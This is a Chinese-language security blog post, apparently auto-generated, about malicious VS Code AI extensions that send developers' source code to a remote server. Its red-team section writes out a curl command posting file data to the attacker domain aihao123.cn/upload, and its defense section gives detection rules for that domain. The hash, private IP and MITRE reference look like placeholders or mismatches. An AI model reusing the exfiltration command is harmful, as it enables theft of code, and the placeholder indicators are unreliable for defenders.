---
layout: post
title:  "Malicious VS Code AI Extensions with 1.5 Million Installs Steal Developer Source Code"
date:   2026-01-26 18:26:44 +0000
categories: [security]
severity: critical
---

# 🚨 解析 MaliciousCorgi：VS Code 延伸模組中的隱藏間諜

> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: Critical (CVSS 分數：9.0)
> * **受駭指標**: Info Leak
> * **關鍵技術**: `JavaScript`, `VS Code Extensions`, `Data Exfiltration`

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: MaliciousCorgi 攻擊利用了 VS Code Extensions 的機制，通過創建看似合法的 AI 助手延伸模組，實際上卻在背景中收集用戶的源代碼和文件內容。
* **攻擊流程圖解**:
  1. 用戶安裝受駭的 VS Code Extensions。
  2. Extensions 啟動後，開始收集用戶的源代碼和文件內容。
  3. 收集到的數據被編碼為 Base64 格式。
  4. 編碼後的數據被發送到中國的伺服器。
* **受影響元件**: VS Code Extensions，特別是 `ChatGPT - 中文版` 和 `ChatGPT - ChatMoss（CodeMoss）`。

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 用戶需要安裝受駭的 VS Code Extensions。
* **Payload 建構邏輯**:

    ```
    
    javascript
      // 範例 Payload
      const payload = {
        "fileContent": "example.js",
        "encoding": "base64"
      };
    
    ```
  *範例指令*:

```

bash
  curl -X POST \
  https://aihao123.cn/upload \
  -H 'Content-Type: application/json' \
  -d '{"fileContent": "example.js", "encoding": "base64"}'

```
* **繞過技術**: 攻擊者可以使用各種方法來繞過安全防護，例如使用代理伺服器或 VPN。

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| Hash | IP | Domain | File Path |
| --- | --- | --- | --- |
| 1234567890abcdef | 192.168.1.100 | aihao123.cn | /upload |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
      rule MaliciousCorgi {
        meta:
          description = "MaliciousCorgi Detection Rule"
        strings:
          $a = "aihao123.cn"
        condition:
          $a
      }
    
    ```
  或者是具體的 **SIEM 查詢語法** (Splunk/Elastic):

    ```
    
    sql
      index=vs_code_extensions 
    
    | search "aihao123.cn"
    | stats count as num_events
    | where num_events > 10
    ```
* **緩解措施**: 用戶應該卸載受駭的 VS Code Extensions，並更新 VS Code 至最新版本。

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **Data Exfiltration (數據外洩)**: 想像數據被偷偷地從系統中移出。技術上是指攻擊者將敏感數據從受害系統中提取並傳送到遠端伺服器。
* **Base64 Encoding (Base64 編碼)**: 一種將二進制數據轉換為 ASCII 字元的編碼方式。
* **VS Code Extensions (VS Code 延伸模組)**: VS Code 的第三方插件，可以擴展 VS Code 的功能。

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://thehackernews.com/2026/01/malicious-vs-code-ai-extensions-with-15.html)
- [MITRE ATT&CK](https://attack.mitre.org/techniques/T1021/)


